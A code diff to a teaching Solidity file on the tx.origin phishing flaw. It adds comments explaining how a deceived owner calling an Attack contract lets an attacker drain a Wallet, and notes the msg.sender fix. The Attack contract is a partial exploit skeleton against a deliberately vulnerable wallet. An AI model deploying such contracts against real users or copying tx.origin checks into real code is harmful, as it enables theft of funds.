@@ -1,6 +1,15 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
 
+/*
+1. Alice deploys Wallet with 1 ETH.
+2. Bob deploys Attack with Alice's address.
+3. Alice calls the Attack.attack function by being deceieved
+4. tx.origin is Alice and hence the balance is transferred to Bob
+5. Correct by using msg.sender
+
+*/
+
 contract Wallet {
     address public owner;
 
@@ -17,12 +26,12 @@ contract Wallet {
 }
 
 contract Attack {
-    address payable public owner;
-    Wallet wallet;
+    address payable public owner; // attacker's address
+    Wallet wallet; // instance of the Wallet contract
 
     constructor(Wallet _wallet) {
-        wallet = Wallet(_wallet);
-        owner = payable(msg.sender);
+        wallet = Wallet(_wallet); // victim's wallet
+        owner = payable(msg.sender); // attacker's address
     }
 
     function attack() public {
